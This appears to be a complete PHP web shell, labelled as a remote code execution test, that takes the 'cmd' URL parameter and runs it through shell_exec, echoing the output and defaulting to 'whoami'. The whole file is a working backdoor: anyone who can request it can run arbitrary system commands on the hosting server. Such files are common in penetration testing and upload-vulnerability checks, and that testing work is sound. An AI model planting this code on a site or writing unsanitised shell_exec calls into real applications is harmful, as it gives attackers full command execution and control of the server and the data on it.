<?php
// Remote Code Execution test
$cmd = $_GET['cmd'] ?? 'whoami';
echo shell_exec($cmd);
?>